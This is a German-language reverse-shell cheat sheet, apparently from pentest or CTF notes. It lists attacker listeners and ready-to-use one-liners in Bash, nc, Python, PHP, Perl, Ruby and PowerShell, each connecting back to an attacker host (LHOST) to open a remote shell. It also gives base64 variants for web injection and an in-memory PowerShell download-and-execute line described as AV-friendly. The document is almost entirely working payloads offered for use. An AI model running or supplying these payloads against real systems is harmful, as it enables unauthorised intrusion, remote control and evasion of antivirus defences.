# 🐚 Reverse-Shell-Payloads

> Immer zuerst Variablen setzen: `export LHOST=$(ip a show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')` und `export LPORT=4444`.
> Generator für Sonderfälle: https://www.revshells.com/

## Listener (Angreifer)

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444                 # mit History & Pfeiltasten
pwncat-cs -lp 4444                   # auto-PTY-Upgrade
stty raw -echo; (stty size; cat) | nc -lvnp 4444   # für ConPtyShell
```

## 🐧 Bash

```bash
bash -i >& /dev/tcp/$LHOST/4444 0>&1
bash -c 'bash -i >& /dev/tcp/'$LHOST'/4444 0>&1'
exec 5<>/dev/tcp/$LHOST/4444; cat <&5 | while read l; do $l 2>&5 >&5; done
# /bin/sh-Variante (wenn kein bash):
sh -i >& /dev/tcp/$LHOST/4444 0>&1
```

Base64-Variante (für Web-Injection, vermeidet `/` und `&`):

```bash
echo -n 'bash -i >& /dev/tcp/'$LHOST'/4444 0>&1' | base64 -w0
# Im Payload:
bash -c "{echo,<BASE64>}|{base64,-d}|{bash,-i}"
```

## nc / ncat

```bash
nc -e /bin/bash $LHOST 4444
nc -e /bin/sh $LHOST 4444
ncat $LHOST 4444 -e /bin/bash
# Ohne -e (busybox/Ubuntu-nc):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 4444 >/tmp/f
```

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];import pty;pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## PHP

```php
php -r '$sock=fsockopen("'$LHOST'",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"); ?>
```

## Perl / Ruby

```bash
perl -e 'use Socket;$i="'$LHOST'";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e 'f=TCPSocket.open("'$LHOST'",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 🪟 PowerShell

```powershell
# Einzeiler (Nishang-Stil)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Base64-encoded (UTF-16LE) ausführen
powershell -e <BASE64>

# In-Memory von Kali laden (kein Disk-Write -> AV-freundlicher)
IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port 4444
```

→ Stabile Windows-PTY (TAB/Editing): ConPtyShell, siehe [shell-upgrade.md](./shell-upgrade.md).

## msfvenom-basiert

→ Komplettes Payload-Cheatsheet (exe, elf, war, aspx, msi, dll, raw): [msfvenom.md](./msfvenom.md)

## ➡️ Shell stabilisieren

→ [shell-upgrade.md](./shell-upgrade.md) (dumme Shell → vollwertige PTY)
